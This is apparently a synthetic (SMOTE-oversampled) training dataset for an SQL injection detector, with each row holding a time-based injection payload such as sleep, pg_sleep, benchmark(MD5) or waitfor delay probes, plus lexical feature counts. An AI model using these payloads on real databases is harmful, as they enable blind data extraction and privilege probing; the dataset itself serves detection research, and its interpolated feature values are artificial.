id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000313,attack,time,sleep  (  __TIME__  )  #,nearest_attack_euclidean,R000041,0.41787971304494975,26.083459388358143,13.367669303827908,3.1341176949049365,9.245112869218604,0.12255643460930266,9.470677215311628,7.245112869218605,0.36192233167278787,0.0029891813319342098,0.35226481510224994,0.282823671893028,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,2.245112869218605,1.3877787807814457e-17,4.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.12255643460930232,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1225564346093022
SMOTE_000314,attack,time,"; if not  (  substring   (    (   select @@version  )  ,24,1  )   <> 1  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000005,0.007841461624056679,100.0,33.0,4.067280539856925,39.0,7.0,35.0,19.0,0.39,0.07,0.35,0.19,2.0,0.0,2.0,0.0,0.0,0.0,1.0,6.0,1.3877787807814457e-17,0.0,2.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000315,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,0.8102846175914087,34.62242304327589,16.0,3.133657426186062,11.0,0.0,14.622423043275882,9.0,0.31808692092525065,1.3877787807814457e-17,0.42166014377227157,0.2602529353024778,0.2074743477586276,1.5850513044827448,0.0,0.0,0.0,1.0,0.0,2.2074743477586276,1.3877787807814457e-17,4.0,0.0,0.9999999999999999,0.2074743477586276,0.7925256522413724,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000316,attack,time,1 or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000002,0.34724038350480435,33.989444763053896,16.670185078982033,3.4331538998870776,13.0,0.6701850789820343,10.989444763053895,9.329814921017965,0.3831121364312284,0.020308638757031358,0.3221862201601344,0.2743930046516059,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,2.3298149210179653,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000317,attack,time,""" or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000040,1.2354805129369808,36.63799660509156,16.329749575636445,3.1439008763734146,11.329749575636445,0.3297495756364448,15.648747878182219,9.329749575636445,0.31305501347978354,0.0065949915127288955,0.42301498552171396,0.2573350094857736,1.1102230246251565e-16,2.3297495756364444,0.0,0.0,0.0,1.0,0.0,2.329749575636444,0.329749575636444,3.340500848727112,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.16487478781822218,0.8351252121817779,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000318,attack,time,1'   )    )    as kahn where 1361  =  1361 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000062,0.03520984286009262,118.97257498374495,26.986287491872474,3.268999418525988,38.031995852297555,9.963433311659928,56.97257498374495,14.00457083604251,0.31968838083149415,0.08373040932922451,0.478865148285282,0.11771606155399936,0.995429163957491,0.018283344170036187,0.0,0.0,1.0,0.9954291639574909,0.0,10.0,1.3877787807814457e-17,0.0,0.0,1.995429163957491,0.9954291639574909,0.004570836042509019,0.0,0.9954291639574908,0.0,0.995429163957491,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.9954291639574911,1.0,0.004570836042509019,0.995429163957491,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.995429163957491
SMOTE_000319,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.38374227976297465,43.819896710319114,16.0,2.839771335157489,11.0,0.0,22.18324725859926,10.636649451719851,0.254463642062973,1.3877787807814457e-17,0.501759496705823,0.24377686123120396,1.1102230246251565e-16,2.0,0.0,0.0,0.0,1.0,0.0,3.636649451719852,1.3877787807814457e-17,4.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000320,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,3.1151183981620862,96.5006539218895,21.642950560269927,3.0786896737783103,34.39327752121467,2.0,46.285901120539855,13.821475280134964,0.35074554226051335,0.021134689448851746,0.4834745941285413,0.14464517416209355,0.5892623599325181,1.6429505602699275,0.0,0.0,1.0,0.0,0.0,9.410737640067481,0.5892623599325181,0.0,0.0,0.9999999999999999,0.5892623599325181,0.4107376400674819,0.0,0.589262359932518,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.41073764006748187,0.5892623599325181,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000321,attack,time,"1'  )   as xvcr where 6456  =  6456 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000078,3.0539600950072696,95.19322835112399,29.0241535438905,3.692298968331184,21.12076771945249,25.60869094750724,36.9758464561095,11.48792322805475,0.21899510523093213,0.26692314664206296,0.39209418193715156,0.1219875661898533,1.0,0.0,1.024153543890498,0.0,0.0,1.512076771945249,0.0,5.975846456109502,0.48792322805475097,0.0,1.0,2.536230315835747,1.0,0.0,0.512076771945249,0.48792322805475097,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.512076771945249,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.512076771945249
SMOTE_000322,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.06337977808530067,49.73437022066345,20.0,3.301481299391225,13.0,10.73437022066345,20.0,6.0,0.2614094641352552,0.21577160759423453,0.402168406361931,0.1206505219085793,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,4.0,1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000323,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000013,0.052186424311417824,50.30183977096822,20.0,3.2975974960256798,13.0,10.97256002082107,20.274399791789293,6.0548799583578585,0.25871346982866006,0.218461561823083,0.4025190800557706,0.12030588829248642,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,4.0548799583578585,1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000324,attack,time,"1""  )   as xioc where 7260  =  7260 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000075,1.7022911271099725,80.5838854629674,26.89597136574185,3.5908216671841355,19.159952276236417,18.0,33.7919427314837,9.631990455247283,0.23679844460238197,0.22457535240396237,0.4189033449652358,0.11972285802841984,0.36800954475271663,0.6319904552472835,0.0,0.0,0.0,2.0,0.0,4.6319904552472835,1.3877787807814457e-17,0.0,1.0,2.0,0.36800954475271647,0.6319904552472835,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.3680095447527165,0.6319904552472835,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000325,attack,time,"1%'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000067,0.7262981459623634,65.65879405838074,19.829397029190364,2.9219889017215843,10.829397029190364,10.0,34.0,10.829397029190366,0.16488955238739963,0.15232293073300018,0.5178979644922006,0.16488955238739963,1.0,0.0,0.0,0.0,0.0,1.0,0.0,6.0,0.829397029190365,0.0,1.0,0.9999999999999999,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8293970291903651,0.17060297080963494,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000326,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,1.7646316624239555,81.92128643128754,25.6547403683769,3.4856546346542783,22.64042881042918,12.64758458940304,35.63327303145532,11.0,0.27450785527437815,0.15151213996949356,0.43531994933144824,0.13866005542467996,1.1102230246251565e-16,0.6690519263246201,2.0,0.0,0.0,1.3309480736753798,0.0,5.33094807367538,0.66905192632462,1.0,0.0,3.3309480736753803,0.0,0.66905192632462,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.33094807367538004,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.33094807367538
SMOTE_000327,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,0.9872041085263918,46.53920425662368,16.26960212831184,2.8023277841681287,11.26960212831184,0.26960212831184016,24.0,11.0,0.24194367438238443,0.005392042566236793,0.5161126512352312,0.23655163181614763,1.1102230246251565e-16,2.2696021283118397,0.0,0.0,0.0,1.0,0.0,4.0,0.2696021283118394,3.4607957433763215,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.13480106415591975,0.8651989358440804,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000328,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,0.5450909024036216,38.76356807633179,16.0,3.189350819523332,13.0,0.0,15.302973396943157,10.460594679388631,0.3373502744759833,1.3877787807814457e-17,0.39218297440320127,0.2704667511208154,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,3.460594679388631,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000329,attack,time,1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000059,0.2871959860306105,86.12938644038135,20.513357472900616,2.9754294459748287,27.41068597832049,2.410685978320492,43.308014483740365,13.0,0.3181324765549143,0.027119245220063676,0.5034213979308997,0.15132688029412233,1.0,0.0,0.0,0.0,1.0,0.051335747290061406,0.0,9.0,0.9486642527099386,0.0,0.0,1.0513357472900613,1.0,0.0,0.0,1.0,0.0,0.051335747290061406,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.051335747290061406,1.0,0.0,0.9486642527099385,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000330,attack,time, )    )    or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000010,0.3614455625278145,40.16749937757364,16.0,3.1387566636705726,13.0,0.0,16.472916147978033,10.694583229595606,0.32527943656848063,1.3877787807814457e-17,0.4079679162822433,0.2667526471492761,1.1102230246251565e-16,0.0,2.0,0.0,0.0,0.0,0.0,3.694583229595607,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000331,attack,time,"1""   )    )    as klie where 2840  =  2840 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000052,0.14130732379122155,107.36236356275197,28.9362363562752,3.700411118456359,27.77682724696319,27.063763643724805,41.61741813765118,10.904354534412796,0.2586017637747232,0.2525360540117819,0.38735920551670294,0.1015029766967919,1.1102230246251565e-16,0.9681181781375987,0.0,0.0,0.0,2.0,0.0,5.936236356275197,1.3877787807814457e-17,0.0,1.0,2.0,0.0,0.9681181781375985,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.03188182186240138,0.9681181781375985,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000332,attack,time,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,nearest_attack_euclidean,R000072,0.5516315942609625,85.01855034910702,20.38949036762671,2.9617880627830493,29.655334062413523,2.0,42.8763533271601,10.486862959533388,0.34699093280195475,0.023738711342735377,0.5062682773758509,0.12300207847945907,1.1102230246251565e-16,0.38949036762671113,0.0,0.0,1.0,0.0,0.0,9.097372591906678,1.3877787807814457e-17,0.0,0.0,0.9999999999999999,0.0,0.09737259190667777,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000333,attack,time," )    )   ,waitfor delay '0:0:__TIME__'--",nearest_attack_euclidean,R000020,2.0074140439553356,54.494521576264916,25.409735995761594,4.128810926769013,25.15699678389405,2.4819471991523185,13.373630394066229,13.48194719915232,0.44663291725677534,0.046225094384134045,0.24509495595407077,0.26204703240501986,2.9638943983046366,0.0,2.0,0.0,0.0,0.0,0.0,2.0,1.3877787807814457e-17,2.5541584025430453,1.0,2.963894398304637,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.48194719915231843,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4819471991523185
SMOTE_000334,attack,time, )   or pg_sleep  (  __TIME__  )  --,nearest_attack_euclidean,R000032,1.181905891418678,37.793790431117905,16.467356618764676,3.2743383149952723,13.0,0.0,14.261147049882583,10.532643381235323,0.34897599162732124,1.3877787807814457e-17,0.3698989526226163,0.28112505575006247,1.1102230246251565e-16,0.4673566187646771,2.0,0.0,0.0,0.0,0.0,3.0652867624706457,1.3877787807814457e-17,5.0,0.0,2.0,0.0,0.46735661876467705,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000335,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.9784470923132178,93.65603260047038,27.96555235103961,4.1230595659511105,48.5866282124753,4.0,26.138299685915882,14.931104702079216,0.5208632375337174,0.045783417718861755,0.2683294665554124,0.1650238781920084,3.9999999999999996,0.0,2.0,0.0,0.0,0.0,0.0,3.931104702079215,1.3877787807814457e-17,0.5172238244801961,1.0,3.482776175519804,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.4827761755198039,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.482776175519804
SMOTE_000336,attack,time,"""  )   or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000012,1.2073333837031055,42.326650637603706,16.554441772933952,3.0203583969017886,10.722779113533024,2.772208864669758,19.663325318801853,9.168337340599074,0.2582178121740307,0.0543570365621521,0.4640472478413301,0.22337790342248703,1.1102230246251565e-16,1.7227791135330246,0.0,0.0,0.0,1.0,0.0,3.2772208864669756,1.3877787807814457e-17,2.8911164541320975,0.27722088646697574,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000337,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000055,0.7629966061150703,68.35378897201589,19.67075779440318,3.0158253000096513,22.15234771958887,1.8353788972015908,33.859925663620665,10.50613669160477,0.3274368504664017,0.026611653538114163,0.49272818891925574,0.15322330707622833,3.83537889720159,0.0,0.0,0.0,0.0,0.8353788972015899,0.0,5.67075779440318,1.3877787807814457e-17,0.16462110279841013,0.0,0.8353788972015899,1.0,0.0,0.0,0.0,0.0,0.8353788972015899,1.0,0.0,0.0,0.0,0.0,0.1646211027984102,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8353788972015899,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000338,attack,time, )   or sleep  (  __TIME__  )    =  ',nearest_attack_euclidean,R000018,0.40824898964623274,34.98359239963449,16.0,3.078523017008722,11.0,0.0,15.38687391970759,8.596718479926897,0.3160308138547472,1.3877787807814457e-17,0.43800106776638054,0.24596811837887234,1.0,0.0,0.0,0.0,0.0,1.0,0.0,2.5967184799268974,1.3877787807814457e-17,4.0,0.0,0.9999999999999999,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000339,attack,time,"""   )    )    or sleep  (  __TIME__  )    =  """,nearest_attack_euclidean,R000028,1.6513344188883696,46.901947773599645,16.450973886799822,2.825979161730943,11.450973886799824,0.450973886799825,24.0,11.0,0.2438362492535634,0.009019477735996484,0.5123275014928732,0.2348167715175669,1.1102230246251565e-16,2.4509738867998245,0.0,0.0,0.0,1.0,0.0,4.0,0.4509738867998243,3.098052226400352,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.22548694339991224,0.7745130566000877,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000340,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000039,0.24980117100453716,50.64750786712224,20.0,3.2423403536858886,13.0,10.0,21.37292322260187,6.274584644520374,0.2581406482861863,0.19856972945091256,0.4196463969772655,0.12364322528563562,1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,4.274584644520373,1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000341,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000014,1.2701638612253476,85.18718282931437,27.619885013441404,4.1648482385955345,44.438620161296825,4.0,22.508792641134725,14.239770026882805,0.5236227666994173,0.049850092278840644,0.25409610559548634,0.17243103542625565,3.9999999999999996,0.0,2.0,0.0,0.0,0.0,0.0,3.2397700268828045,1.3877787807814457e-17,0.6900574932792989,1.0,3.3099425067207013,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.3099425067207012,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3099425067207013
SMOTE_000342,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000071,1.1517292682267288,79.2129805423962,25.44934950748168,3.488663541691246,21.657140763716416,11.932466009975574,34.381815517457255,11.241558251246946,0.271979928090991,0.14823276744256256,0.4346755875151151,0.14511171695133132,1.1102230246251565e-16,1.0,2.0,0.0,0.0,1.2415582512469467,0.0,5.241558251246947,0.7584417487530531,1.0,0.0,3.241558251246947,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.24155825124694688,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2415582512469467
SMOTE_000343,attack,time,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",nearest_attack_euclidean,R000007,3.425972222801541,108.59633466626948,31.190245333416954,4.037897893492053,48.95365066620676,5.642684000062713,35.90487733329152,18.095122666708477,0.44547126173413165,0.05353731574305758,0.33232067395039666,0.16867074857241407,2.9048773332915236,0.0,2.0,0.0,0.0,0.0,0.5475613333542381,6.0,1.3877787807814457e-17,0.0,1.547561333354238,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.5475613333542381,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5475613333542381,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.547561333354238
